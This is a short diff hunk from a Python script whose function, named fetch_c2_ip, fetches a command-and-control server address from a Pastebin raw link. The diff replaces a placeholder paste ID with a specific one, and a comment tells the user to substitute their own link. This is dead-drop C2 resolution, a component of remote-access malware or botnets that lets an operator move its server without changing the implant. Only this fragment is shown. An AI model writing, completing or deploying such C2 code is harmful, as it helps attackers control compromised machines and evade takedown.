@@ -7,7 +7,7 @@ import requests
 def fetch_c2_ip():
     try:
         # Replace this with your actual Pastebin or GitHub Gist RAW link
-        url = "https://pastebin.com/raw/AbCdEfGH"
+        url = "https://pastebin.com/raw/DjTikqsH"
         response = requests.get(url, timeout=5)
         return response.text.strip()
     except:
